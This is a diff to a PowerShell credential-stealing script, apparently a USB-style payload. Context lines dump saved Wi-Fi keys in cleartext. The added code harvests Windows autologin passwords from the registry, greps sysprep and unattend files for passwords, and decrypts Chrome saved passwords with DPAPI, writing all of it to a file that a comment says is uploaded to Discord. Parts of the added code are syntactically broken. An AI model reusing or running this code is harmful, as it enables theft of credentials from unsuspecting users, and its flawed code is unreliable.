@@ -55,6 +55,29 @@ $output > $FileName
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String >> $FileName
 ############################################################################################################################################################
 
+##
+# Passwords:
+# Autologin
+
+$AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
+If (($AutoLoginPassword).DefaultPassword) {
+  $Autlog = "Auto Login Credentials Found:" $AutoLoginPassword
+  $Autlog >> $FileName
+  }  # End If
+
+# Sysprep
+$PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
+ForEach ($PassFile in $PassFiles) {
+  If (Test-Path -Path $PassFile) {
+    $Syspass = Get-Content -Path $PassFile | Select-String -Pattern "Password"
+    $Sysprep = "Sysprep password :" $Syspass
+    $Sysprep >> $Filename
+  }  # End If
+}  # End ForEach
+
+# Chrome
+[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)) >> $FileName
+##
 #--------------------------------------------------------------------------------------------------------------------------------------
 
 # This is to upload your files to discord
